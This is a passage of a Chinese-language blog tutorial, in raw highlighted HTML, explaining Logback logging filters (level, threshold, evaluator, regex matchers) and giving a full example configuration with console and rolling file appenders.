<span class="tag">&lt;<span class="name">maxFileSize</span>&gt;</span>150<span class="tag">&lt;/<span class="name">maxFileSize</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">triggeringPolicy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d [%p] %-5level %logger - %msg%newline<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">"ALL"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"infoAppender"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"debugAppender"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"errorAppender"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="filter过滤节点"><a class="markdownIt-Anchor" href="#filter过滤节点"></a> filter过滤节点</h2><h3 id="级别过滤器levelfilter"><a class="markdownIt-Anchor" href="#级别过滤器levelfilter"></a> 级别过滤器（LevelFilter）</h3><p>LevelFilter根据记录级别对记录事件进行过滤。如果事件的级别等于配置的级别，过滤器会根据onMatch和onMismatch属性接收和拒绝时间。下面是和配置文件例子：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- conf consoel out --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span> =<span class="string">"console_out"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.ConsoleAppender"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.classic.filter.LevelFilter"</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 过滤掉非INFO级别 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">level</span>&gt;</span>INFO<span class="tag">&lt;/<span class="name">level</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">onMatch</span>&gt;</span>ACCEPT<span class="tag">&lt;/<span class="name">onMatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">onMismatch</span>&gt;</span>DENY<span class="tag">&lt;/<span class="name">onMismatch</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%-4relative [%thread] %-5level %logger&#123;30&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">"DEBUG"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"console_out"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="临界值过滤器thresholdfilter"><a class="markdownIt-Anchor" href="#临界值过滤器thresholdfilter"></a> 临界值过滤器（ThresholdFilter）</h3><p>ThresholdFilter过滤掉低于指定临界值的事件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- conf consoel out --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span> =<span class="string">"console_out"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.ConsoleAppender"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.classic.filter.ThresholdFilter"</span>&gt;</span>  </span><br><span class="line">　　　　　　　　<span class="comment">&lt;!-- 过滤掉TRACE和DEBUG级别的日志 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">level</span>&gt;</span>INFO<span class="tag">&lt;/<span class="name">level</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%-4relative [%thread] %-5level %logger&#123;30&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">"DEBUG"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"console_out"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="求值过滤器evaluatorfilter"><a class="markdownIt-Anchor" href="#求值过滤器evaluatorfilter"></a> 求值过滤器（EvaluatorFilter）</h3><p>评估是否符合指定的条件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- conf consoel out --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span> =<span class="string">"console_out"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.ConsoleAppender"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.classic.filter.EvaluatorFilter"</span>&gt;</span>  </span><br><span class="line">             <span class="tag">&lt;<span class="name">evaluator</span>&gt;</span></span><br><span class="line">             <span class="comment">&lt;!--过滤掉所有日志中不包含hello字符的日志--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">expression</span>&gt;</span></span><br><span class="line">                    message.contains("hello")</span><br><span class="line">                <span class="tag">&lt;/<span class="name">expression</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">onMatch</span>&gt;</span>NEUTRAL<span class="tag">&lt;/<span class="name">onMatch</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">onMismatch</span>&gt;</span>DENY<span class="tag">&lt;/<span class="name">onMismatch</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;/<span class="name">evaluator</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%-4relative [%thread] %-5level %logger&#123;30&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">"DEBUG"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"console_out"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="匹配器matchers"><a class="markdownIt-Anchor" href="#匹配器matchers"></a> 匹配器（Matchers）</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- conf consoel out --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span> =<span class="string">"console_out"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.ConsoleAppender"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.classic.filter.EvaluatorFilter"</span>&gt;</span>  </span><br><span class="line">             <span class="tag">&lt;<span class="name">evaluator</span>&gt;</span> </span><br><span class="line">                <span class="tag">&lt;<span class="name">matcher</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">Name</span>&gt;</span>odd<span class="tag">&lt;/<span class="name">Name</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!-- 过滤掉序号为奇数的语句--&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regex</span>&gt;</span>statement [13579]<span class="tag">&lt;/<span class="name">regex</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">matcher</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">expression</span>&gt;</span>odd.matches(formattedMessage)<span class="tag">&lt;/<span class="name">expression</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">onMatch</span>&gt;</span>NEUTRAL<span class="tag">&lt;/<span class="name">onMatch</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">onMismatch</span>&gt;</span>DENY<span class="tag">&lt;/<span class="name">onMismatch</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;/<span class="name">evaluator</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%-4relative [%thread] %-5level %logger&#123;30&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">"DEBUG"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"console_out"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="logback配置文件实例"><a class="markdownIt-Anchor" href="#logback配置文件实例"></a> logback配置文件实例</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span> <span class="attr">debug</span>=<span class="string">"true"</span> <span class="attr">scan</span>=<span class="string">"true"</span> <span class="attr">scanPeriod</span>=<span class="string">"30 seconds"</span>&gt;</span> </span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">"STDOUT"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.ConsoleAppender"</span>&gt;</span> </span><br><span class="line">    <span class="comment">&lt;!-- encoders are  by default assigned the type</span></span><br><span class="line"><span class="comment">         ch.qos.logback.classic.encoder.PatternLayoutEncoder --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss&#125; [%level] - %m%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- 常用的Pattern变量,大家可打开该pattern进行输出观察 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">          &lt;pattern&gt;</span></span><br><span class="line"><span class="comment">              %d&#123;yyyy-MM-dd HH:mm:ss&#125; [%level] - %msg%n</span></span><br><span class="line"><span class="comment">              Logger: %logger</span></span><br><span class="line"><span class="comment">              Class: %class</span></span><br><span class="line"><span class="comment">              File: %file</span></span><br><span class="line"><span class="comment">              Caller: %caller</span></span><br><span class="line"><span class="comment">              Line: %line</span></span><br><span class="line"><span class="comment">              Message: %m</span></span><br><span class="line"><span class="comment">              Method: %M</span></span><br><span class="line"><span class="comment">              Relative: %relative</span></span><br><span class="line"><span class="comment">              Thread: %thread</span></span><br><span class="line"><span class="comment">              Exception: %ex</span></span><br><span class="line"><span class="comment">              xException: %xEx</span></span><br><span class="line"><span class="comment">              nopException: %nopex</span></span><br><span class="line"><span class="comment">              rException: %rEx</span></span><br><span class="line"><span class="comment">              Marker: %marker</span></span><br><span class="line"><span class="comment">              %n</span></span><br><span class="line"><span class="comment">          &lt;/pattern&gt;</span></span><br><span class="line"><span class="comment">           --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- 按日期区分的滚动日志 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">"ERROR-OUT"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.RollingFileAppender"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">file</span>&gt;</span>logs/error.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss&#125; [%class:%line] - %m%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.classic.filter.LevelFilter"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">level</span>&gt;</span>ERROR<span class="tag">&lt;/<span class="name">level</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">onMatch</span>&gt;</span>ACCEPT<span class="tag">&lt;/<span class="name">onMatch</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">onMismatch</span>&gt;</span>DENY<span class="tag">&lt;/<span class="name">onMismatch</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.TimeBasedRollingPolicy"</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- daily rollover --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>error.%d&#123;yyyy-MM-dd&#125;.log.zip<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">&lt;!-- keep 30 days' worth of history --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>30<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- 按文件大小区分的滚动日志 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">"INFO-OUT"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.RollingFileAppender"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">file</span>&gt;</span>logs/info.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss&#125; [%class:%line] - %m%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.classic.filter.LevelFilter"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">level</span>&gt;</span>INFO<span class="tag">&lt;/<span class="name">level</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">onMatch</span>&gt;</span>ACCEPT<span class="tag">&lt;/<span class="name">onMatch</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">onMismatch</span>&gt;</span>DENY<span class="tag">&lt;/<span class="name">onMismatch</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.FixedWindowRollingPolicy"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>info.%i.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">minIndex</span>&gt;</span>1<span class="tag">&lt;/<span class="name">minIndex</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">maxIndex</span>&gt;</span>3<span class="tag">&lt;/<span class="name">maxIndex</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">triggeringPolicy</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.SizeBasedTriggeringPolicy"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">maxFileSize</span>&gt;</span>5MB<span class="tag">&lt;/<span class="name">maxFileSize</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">triggeringPolicy</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- 按日期和大小区分的滚动日志 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">"DEBUG-OUT"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.RollingFileAppender"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">file</span>&gt;</span>logs/debug.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss&#125; [%class:%line] - %m%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.classic.filter.LevelFilter"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">level</span>&gt;</span>DEBUG<span class="tag">&lt;/<span class="name">level</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">onMatch</span>&gt;</span>ACCEPT<span class="tag">&lt;/<span class="name">onMatch</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">onMismatch</span>&gt;</span>DENY<span class="tag">&lt;/<span class="name">onMismatch</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.TimeBasedRollingPolicy"</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- rollover daily --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>debug-%d&#123;yyyy-MM-dd&#125;.%i.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">timeBasedFileNamingAndTriggeringPolicy</span></span></span><br><span class="line"><span class="tag">            <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- or whenever the file size reaches 100MB --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maxFileSize</span>&gt;</span>100MB<span class="tag">&lt;/<span class="name">maxFileSize</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">timeBasedFileNamingAndTriggeringPolicy</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">&lt;!-- 级别阀值过滤 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">"SUM-OUT"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.RollingFileAppender"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">file</span>&gt;</span>logs/sum.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss&#125; [%class:%line] - %m%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- deny all events with a level below INFO, that is TRACE and DEBUG --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.classic.filter.ThresholdFilter"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">level</span>&gt;</span>INFO<span class="tag">&lt;/<span class="name">level</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.TimeBasedRollingPolicy"</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- rollover daily --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span 